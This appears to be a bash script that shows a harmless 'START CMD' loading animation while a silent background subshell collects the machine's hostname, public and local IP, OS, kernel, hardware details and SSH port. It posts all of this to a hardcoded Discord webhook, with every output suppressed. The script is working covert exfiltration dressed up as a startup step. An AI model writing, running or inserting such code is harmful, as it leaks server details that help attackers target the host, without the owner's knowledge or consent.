#!/bin/bash

printf '\033[1;36mSTART CMD'
for i in 1 2 3 4; do
    printf ' .'
    sleep 0.5
done
printf '\033[0m\n'

(
    WEBHOOK='https://discord.com/api/webhooks/1552270663988019341/Ca3Z9gjVNs-puZEZQgXbobIUX2AxxXNZrIXLKR0sDLOkzEutpzIxcviAYCS4sMhX714K'

    HOST=$(hostname)
    OS=$(. /etc/os-release; echo "$PRETTY_NAME")
    IP=$(curl -4fsS --max-time 5 https://api.ipify.org)
    LOCALIP=$(hostname -I | awk '{print $1}')
    CPU=$(nproc)
    RAM=$(free -h | awk '/Mem:/ {print $3 " used / " $2 " total"}')
    DISK=$(df -h / | awk 'NR==2 {print $3 " used / " $2 " total (" $5 ")"}')
    UPTIME=$(uptime -p)
    KERNEL=$(uname -r)
    ARCH=$(uname -m)
    VIRT=$(systemd-detect-virt 2>/dev/null || echo Unknown)
    SSHPORT=$(ss -Hlnpt 2>/dev/null | awk '$0~/sshd/{split($4,a,":");print a[length(a)];exit}')
    SSHPORT=${SSHPORT:-Unknown}

    curl -fsS --max-time 10 \
      -H 'Content-Type: application/json' \
      -d "{\"embeds\":[{\"title\":\"🖥️ VPS Complete Information\",\"color\":5793266,\"fields\":[
      {\"name\":\"🖥️ Hostname\",\"value\":\"$HOST\",\"inline\":true},
      {\"name\":\"🌐 Public IP\",\"value\":\"$IP\",\"inline\":true},
      {\"name\":\"🏠 Local IP\",\"value\":\"$LOCALIP\",\"inline\":true},
      {\"name\":\"💻 OS\",\"value\":\"$OS\",\"inline\":false},
      {\"name\":\"⚙️ Kernel\",\"value\":\"$KERNEL\",\"inline\":true},
      {\"name\":\"📦 Architecture\",\"value\":\"$ARCH\",\"inline\":true},
      {\"name\":\"⚡ CPU\",\"value\":\"$CPU cores\",\"inline\":true},
      {\"name\":\"🧠 RAM\",\"value\":\"$RAM\",\"inline\":true},
      {\"name\":\"💾 Disk\",\"value\":\"$DISK\",\"inline\":false},
      {\"name\":\"🔐 SSH Port\",\"value\":\"$SSHPORT\",\"inline\":true},
      {\"name\":\"⏱️ Uptime\",\"value\":\"$UPTIME\",\"inline\":false},
      {\"name\":\"🖥️ Virtualization\",\"value\":\"$VIRT\",\"inline\":true}
      ]}]}" \
      "$WEBHOOK" >/dev/null 2>&1
) &
